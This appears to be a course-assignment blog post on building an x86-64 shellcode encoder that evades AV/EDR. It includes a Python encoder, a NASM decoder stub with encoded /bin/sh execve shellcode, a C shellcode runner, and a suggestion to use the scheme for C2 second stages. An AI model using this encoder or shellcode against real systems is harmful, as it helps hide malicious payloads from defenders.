Title: SLAE64 - Assignment 4
Date: 2022-07-16T08:37:18.000Z


## Disclaimer


This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:

[https://www.pentesteracademy.com/course?id=7](https://www.pentesteracademy.com/course?id=7)

Student ID: PA-30398

## Source Code

The source code for this assignment is stored at the following link: [rbctee/SlaeExam](https://github.com/rbctee/SlaeExam/tree/main/slae64/assignment/4/).

Within the directory you can find the following files:

- [encoder.py](https://github.com/rbctee/SlaeExam/blob/main/slae64/assignment/4/encoder.py), a python script which allows you to encode shellcode of arbitrary length and generate an assembly decoder based on a NASM template
-  [decoder.nasm](https://github.com/rbctee/SlaeExam/blob/main/slae64/assignment/4/decoder.nasm), a NASM file that decodes and runs shellcode encoded with `encoder.py`
- [decoder_template.txt](https://github.com/rbctee/SlaeExam/blob/main/slae64/assignment/4/decoder_template.txt), the NASM template used by the encoder to generate the decoder program

## Encoding Scheme

### Principles

Writing an encoding scheme is pretty easy, you can simply apply the NOT operation on all the bytes and call it a day.

Although very basic, it's pretty good in terms of size: if you were to encode a 40 bytes long shellcode, the encoded version would probably be something like 55 bytes.

Nonetheless, there are a few drawbacks:

- it doesn't manage NULL bytes, so if the shellcode contains the byte `0xff`, after the NOT operation they will become `0x00` bytes
- it's not good enough for evading AV/EDR products (I haven't actually tested a NOT encoder against either of them, but I doubt it's going to work)

For this reason, while trying to come up with a new encoding scheme, I decided to focus on the two key points above i.e., managing NULL bytes and being strong enough from an evasion perspective.

### Logic

The encoding scheme I came up with can be summarized in the following four steps:

- XOR each byte of the shellcode with a specific byte, generated at random by the encoder
- pad the shellcode in order for the length to be divisible by 7
- divide the shellcode into groups of 7 bytes
- find a byte that XOR-ed to the other 7 bytes doesn't result in NULL bytes

Here's a visual representation of my encoding scheme:

<figure class="kg-card kg-image-card kg-card-hascaption"><img src="__GHOST_URL__/content/images/2022/07/image-5.png" class="kg-image" alt loading="lazy" width="1165" height="1930" srcset="__GHOST_URL__/content/images/size/w600/2022/07/image-5.png 600w, __GHOST_URL__/content/images/size/w1000/2022/07/image-5.png 1000w, __GHOST_URL__/content/images/2022/07/image-5.png 1165w" sizes="(min-width: 720px) 720px"><figcaption class="figure-caption">Flowchart of the Encoding Scheme</figcaption>

## Encoder

Once the encoding scheme was completed on a theoretical level, I decided to implement it in the programming language I was most comfortable with: Python.

The script (`encoder.py`) is divided into the following functions:

<figure class="kg-card kg-image-card kg-card-hascaption"><img src="__GHOST_URL__/content/images/2022/07/image-6.png" class="kg-image" alt loading="lazy" width="735" height="795" srcset="__GHOST_URL__/content/images/size/w600/2022/07/image-6.png 600w, __GHOST_URL__/content/images/2022/07/image-6.png 735w" sizes="(min-width: 720px) 720px"><figcaption class="figure-caption">Encoding script Call Graph</figcaption>

If this functions seem familiar to you, that may be due to the fact I'm reusing the script I've written for the fourth assignment of the SLAE32 exam.

I'm not going to comment all the script, since that would be useless. Instead, I'll describe some of the choices behind the encoding function:

```py
def encode_shellcode(shellcode: bytes) -> bytes:

    global XOR_BYTE

    encoded_shellcode = bytearray()

    XOR_BYTE = random.choice(range(1, 256))

    print(f"[+] Xoring bytes with the byte {hex(XOR_BYTE)}")

    for b in shellcode:
        encoded_shellcode.append(b ^ XOR_BYTE)

    print(f"[+] Size of intermediate encoded shellcode is {len(encoded_shellcode)}")
    if (len(encoded_shellcode) % 7) != 0:
        print(f"[+] Adding padding to shellcode")

        num_pad_bytes = 7 - (len(encoded_shellcode) % 7)

        for x in range(num_pad_bytes):
            encoded_shellcode.append(0)
    else:
        print(f"[+] No need to add padding to the shellcode")

    print(f"[+] Slicing the shellcode into chunks of 7 bytes")
    bytes_chunks = list(chunks(encoded_shellcode, 7))
    encoded_shellcode = bytearray()

    for c in bytes_chunks:
        
        encoded_chunk = encode_chunk(c)
        encoded_shellcode.extend(encoded_chunk)

    print(f"[+] Finished encoding chunks")

    return encoded_shellcode
```

<figcaption class="figure-caption">Encoding function</figcaption>

First, it encodes each byte of the shellcode through the XOR operation. The XOR key in this case is a single byte `chosen at random`.

Next, the function checks the length of the shellcode, adding NULL bytes at the end in case the length is not a multiple of 7, which is the size I chose for the chunks.

After that, the shellcode is divided into chunks, each of them XOR-encoded with a random byte which must not be already present in the chunk, in order to avoid NULL bytes in the final encoded shellcode.

This XOR byte is prepended to the chunk, thus obtaining a **QWORD** (8 bytes).

Initially, while I was pondering on the details of the encoding scheme, I chose 8 as the size of the chunks because I was thinking of loading chunks into registers.

Nonetheless, I decided against that idea since the decoder would have become more complex: to extract the prepended byte I would have to rotate the other bytes a few times.

To calculate the size of the encoded shellcode, you can use this formula:

```py
def f(x):
    return (x + (7 - (x % 7))) * (8/7)
```

<figcaption class="figure-caption">Encoded Shellcode Length</figcaption>

Before continuing to the decoder, I think it's important to add a few notes regarding the features of the encoder.

The script uses a NASM template (by default loaded from the file `decoder_template.txt`) in order to dynamically generate the final decoder program.

I chose this approach to avoid adding too many instructions to the decoder; initially the length of the decoder was around 100 bytes when it included the routine for retrieving the length of the encoded shellcode.

Here's a screenshot of the arguments you can pass to the encoder script:

<figure class="kg-card kg-image-card kg-card-hascaption"><img src="__GHOST_URL__/content/images/2022/07/image-7.png" class="kg-image" alt loading="lazy" width="1219" height="428" srcset="__GHOST_URL__/content/images/size/w600/2022/07/image-7.png 600w, __GHOST_URL__/content/images/size/w1000/2022/07/image-7.png 1000w, __GHOST_URL__/content/images/2022/07/image-7.png 1219w" sizes="(min-width: 720px) 720px"><figcaption class="figure-caption">Python encoder</figcaption>

The value of the argument `OUTPUT_DECODER` is the final decoder program you can then assemble to get the final shellcode.

## Decoder

As for the decoder, its length is a little bit more than 50 bytes; it's not good enough for exploits where size is a vital factor e.g., buffer overflows, or egghunters.

However, in my opinion it's good enough for bigger payloads; think of situations in which there are Network Security products scanning the network traffic.

This encoding scheme could be useful to Command &amp; Control frameworks for sending second stages or shellcodes to their implants.

The decoder discussed in this paragraph was generated with the following polymorphic stack-based execve shellcode I developed while taking the course:  

<figure class="kg-card kg-bookmark-card kg-card-hascaption"><a class="kg-bookmark-container" href="https://github.com/rbctee/MalwareDevelopment/blob/master/code/shellcode/unix/x86-64/execve_shellcode_stack_polymorphic.nasm"><div class="kg-bookmark-content"><div class="kg-bookmark-title">MalwareDevelopment/execve_shellcode_stack_polymorphic.nasm at master · rbctee/MalwareDevelopment</div><div class="kg-bookmark-description">Code and notes regarding Malware Development. Contribute to rbctee/MalwareDevelopment development by creating an account on GitHub.</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://github.com/fluidicon.png" alt=""><span class="kg-bookmark-author">GitHub</span><span class="kg-bookmark-publisher">rbctee</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://opengraph.githubassets.com/f37090b96514c0f09652c023e218f231b6612d080630f05accc9c7879297aba8/rbctee/MalwareDevelopment" alt=""></div></a><figcaption class="figure-caption">Polymorphic shellcode used for generating the decoder</figcaption>

Here's the full source code of the decoder program:

```nasm
; Author: Robert C. Raducioiu

global _start

section .text

_start:

    ; clear RCX
    xor ecx, ecx

    jmp short CallShellcode

Shellcode:

    ; get the address of the encoded shellcode using
    ; the JMP-CALL-POP technique
    pop rsi
    
    ; statically set the size of the shellcode
    add cl, 80

    ; save the base address of the shellcode in RDX
    push rsi
    pop rdx

    ; push to the stack for later use
    push rdx

    ; skip the next routine
    jmp short LoopDecodeSkip

LoopDecode:

    ; increase registers to step to the next chunk
    add rsi, 8
    add rdx, 7

LoopDecodeSkip:

    ; clear RAX
    xor eax, eax

    ; get the XOR byte of the chunk and XOR it
    ; with the XOR byte generated initially
    mov bl, BYTE [rsi]
    xor bl, 0xc

CopyDecodedByte:

    ; step to the next encoded byte
    add al, 1

    ; decode the encoded byte
    mov bh, BYTE [rsi + rax]
    xor bh, bl

    ; replace the encoded byte with the decoded one
    mov BYTE [rdx + rax], bh

    ; if RAX is 7 it means we decoded 7 bytes
    ; it's time to go to the next chunk
    cmp al, 7
    jz LoopDecode

    ; if RCX != 0 then go back to decoding
    loop CopyDecodedByte

RunShellcode:

    ; skip the first byte (XOR byte)
    pop rax
    add al, 1

    ; run the decoded shellcode
    call rax

CallShellcode:

    call Shellcode
    encoded: db 0x50,0x6d,0x95,0x14,0xab,0xbd,0x14,0xd5,0xd1,0x89,0xf9,0x25,0x95,0x5e,0x31,0xd5,0x27,0x7f,0x71,0x63,0x95,0x70,0x2a,0x20,0x14,0x4,0x43,0x54,0x9,0x2,0x50,0xa3,0x13,0x6b,0x7c,0x7d,0x6d,0x6b,0x7c,0x7d,0xe1,0x9f,0xa5,0xdc,0x33,0xbb,0xb9,0xb2,0x13,0x4e,0x57,0x96,0x63,0x3b,0xe7,0x57,0x1c,0x93,0xfc,0x18,0x58,0x9d,0x24,0x34,0x6b,0xe4,0xa7,0x5b,0x2f,0x98,0xaf,0x68,0x49,0x40,0x49,0x49,0x49,0x49,0x49,0x49

```

<figcaption class="figure-caption">Assembly decoder</figcaption>

I won't describe each instruction, mostly because there's a comment for almost each one, but I'm going to list some key points:

- It uses the `JMP-CALL-POP` technique to retrieve the address of the encoded shellcode.
- It uses the register `CL` to determine the length of the shellcode. The value is statically set by the encoder; in case it's greater than 256, it uses the register `CX`.
- It uses the `LOOP` instruction to check if the counter register reached 0, hence determine if all the encoded bytes were decoded.

## Testing

As mentioned previously, I tested the program with a polymorphic version of the stack-based execve shellcode.

For the final Proof of Concept, I chose the simple version of the stack-based execve shellcode, which you can get here:

<figure class="kg-card kg-bookmark-card kg-card-hascaption"><a class="kg-bookmark-container" href="https://github.com/rbctee/MalwareDevelopment/blob/master/code/shellcode/unix/x86-64/execve_shellcode_stack.nasm"><div class="kg-bookmark-content"><div class="kg-bookmark-title">MalwareDevelopment/execve_shellcode_stack.nasm at master · rbctee/MalwareDevelopment</div><div class="kg-bookmark-description">Code and notes regarding Malware Development. Contribute to rbctee/MalwareDevelopment development by creating an account on GitHub.</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://github.com/fluidicon.png" alt=""><span class="kg-bookmark-author">GitHub</span><span class="kg-bookmark-publisher">rbctee</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://opengraph.githubassets.com/f37090b96514c0f09652c023e218f231b6612d080630f05accc9c7879297aba8/rbctee/MalwareDevelopment" alt=""></div></a><figcaption class="figure-caption">Stack-based execve Shellcode</figcaption>

If you pass the shellcode above to the python encoder I wrote, you should obtain something similar to this (minus the encoded bytes, since they are different after each run):

<figure class="kg-card kg-image-card kg-card-hascaption"><img src="__GHOST_URL__/content/images/2022/07/image-9.png" class="kg-image" alt loading="lazy" width="2000" height="705" srcset="__GHOST_URL__/content/images/size/w600/2022/07/image-9.png 600w, __GHOST_URL__/content/images/size/w1000/2022/07/image-9.png 1000w, __GHOST_URL__/content/images/size/w1600/2022/07/image-9.png 1600w, __GHOST_URL__/content/images/2022/07/image-9.png 2097w" sizes="(min-width: 720px) 720px"><figcaption class="figure-caption">Execution of the python encoder</figcaption>

After that, I assembled the file `decoder.nasm` using `nasm` and retrieved the final shellcode using `objcopy`. Follows the C program I've used to test the decoder shellcode:

```cpp
#include <stdio.h>
#include <string.h>

// previously I've commited the error of initializing the buffer 'code' outside the main
// I said error because it would trigger a Segmentation Fault, due to the memory region 
//  not being executable.
// if you declare inside the main, it will be stored inside the .text section, which should be executable
void main(int argc, char* argv[])
{
    unsigned char code[] = \
"\x31\xc9\xeb\x2d\x5e\x80\xc1\x28\x56\x5a\x52\xeb\x08\x48\x83\xc6\x08\x48\x83\xc2\x07\x31\xc0\x8a\x1e\x80\xf3\xd1\x04\x01\x8a\x3c\x06\x30\xdf\x88\x3c\x02\x3c\x07\x74\xe3\xe2\xf0\x58\x04\x01\xff\xd0\xe8\xce\xff\xff\xff\x4e\xae\x5f\xcf\xd7\x16\x7d\xd7\xcd\xa7\x33\x7e\x75\x72\x33\x33\x6d\xcf\xd4\xef\xf4\x35\x5b\xec\x14\x92\x8d\x4c\x23\x46\x05\xfe\x7d\xa3\xa9\x7d\x7d\x7d\x7d\x7d";

    printf("[+] Shellcode length: %d\n", (int)strlen(code));

    int (*ret)() = (int(*)())code;
    ret();
}

```

<figcaption class="figure-caption">Shellcode runner</figcaption>

Running the program above, I successfully managed to decode the encoded shellcode and execute the shell `/bin/sh`:

<figure class="kg-card kg-image-card kg-card-hascaption"><img src="__GHOST_URL__/content/images/2022/07/image-8.png" class="kg-image" alt loading="lazy" width="1790" height="589" srcset="__GHOST_URL__/content/images/size/w600/2022/07/image-8.png 600w, __GHOST_URL__/content/images/size/w1000/2022/07/image-8.png 1000w, __GHOST_URL__/content/images/size/w1600/2022/07/image-8.png 1600w, __GHOST_URL__/content/images/2022/07/image-8.png 1790w" sizes="(min-width: 720px) 720px"><figcaption class="figure-caption">Testing the decoder shellcode</figcaption>

